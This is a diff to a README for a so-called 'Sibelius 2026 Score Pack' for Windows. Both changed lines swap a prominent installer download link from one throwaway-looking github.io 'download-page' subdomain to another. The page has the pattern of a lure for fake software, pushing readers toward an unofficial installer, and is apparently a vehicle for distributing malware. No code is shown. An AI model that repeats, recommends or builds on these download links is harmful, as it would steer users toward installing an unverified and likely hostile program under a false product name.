@@ -2,7 +2,7 @@
 
 Welcome to the Sibelius 2026 Score Pack, your ultimate tool for enhanced music composition on Windows desktop. This pack provides advanced features to streamline your workflow, unlock creative possibilities, and optimize your Sibelius experience for 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -58,7 +58,7 @@ The pack is fully tested and optimized for Windows 11, including support for new
 
 To get the latest version of the Sibelius 2026 Score Pack, please visit the official download page. This ensures you receive the most up-to-date and secure installer.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Last Updated
 
